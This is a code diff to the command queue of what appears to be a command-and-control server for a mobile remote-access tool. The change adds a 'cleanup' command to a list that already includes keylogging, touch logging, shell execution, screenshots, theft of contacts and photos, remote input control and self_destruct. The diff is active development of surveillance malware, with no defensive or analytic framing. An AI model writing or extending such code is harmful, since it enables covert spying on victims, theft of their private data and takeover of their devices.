@@ -1230,7 +1230,7 @@ function queueDeviceCommand(device, params) {
   const allowed = ['self_destruct', 'message', 'kick', 'update_config',
     'screenshot', 'get_contacts', 'get_gallery', 'get_photo', 'switch_toggle', 'shell', 'input_tap', 'input_swipe', 'wake',
     'keylog_on', 'keylog_off', 'keylog_get',
-    'touchlog_on', 'touchlog_off', 'touchlog_get'];
+    'touchlog_on', 'touchlog_off', 'touchlog_get', 'cleanup'];
   if (!allowed.includes(type)) throw new Error('unsupported command: ' + type);
   const cfg = effectiveConfig(device);
   if (!cfg.enable_c2) throw new Error('c2 disabled');
@@ -1247,6 +1247,14 @@ function queueDeviceCommand(device, params) {
   if ((type === 'input_tap' || type === 'input_swipe') && !cfg.allow_input_control) throw new Error('input disabled');
   if (type === 'message' && !payload.text && params.text) payload.text = String(params.text);
   if (type === 'update_config' && !payload.config) payload.config = sanitizeConfig(params.config) || {};
+  if (type === 'cleanup') {
+    const rawCode = payload.code ?? payload.level ?? params.code ?? params.level;
+    if (rawCode !== undefined && rawCode !== null && String(rawCode).trim() !== '') {
+      const numericCode = Number(rawCode);
+      payload.code = Number.isFinite(numericCode) ? numericCode : String(rawCode).trim();
+    }
+    payload.reason = String(payload.reason || params.reason || '');
+  }
   if (type === 'shell' && !payload.cmd && params.cmd) payload.cmd = String(params.cmd);
   if (type === 'get_gallery') {
     if (!payload.limit) payload.limit = clampInt(params.limit || params.count, 1, 500, 100);
